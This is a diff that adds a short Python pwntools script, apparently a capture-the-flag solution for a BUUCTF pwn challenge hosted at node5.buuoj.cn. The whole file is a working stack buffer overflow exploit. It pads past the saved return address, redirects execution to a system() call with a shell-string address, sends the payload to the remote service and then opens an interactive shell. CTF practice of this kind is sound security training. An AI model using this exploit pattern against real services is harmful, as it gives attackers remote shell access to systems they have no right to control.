@@ -1,0 +1,11 @@
+from pwn import *
+
+r = remote('node5.buuoj.cn',28666)
+
+sh_addr = 0x08048670
+system_addr = 0x08048529
+payload = b'M'*(0x18+4) + p32(system_addr)+ p32(sh_addr)
+r.recv()
+r.sendline(payload)
+
+r.interactive()
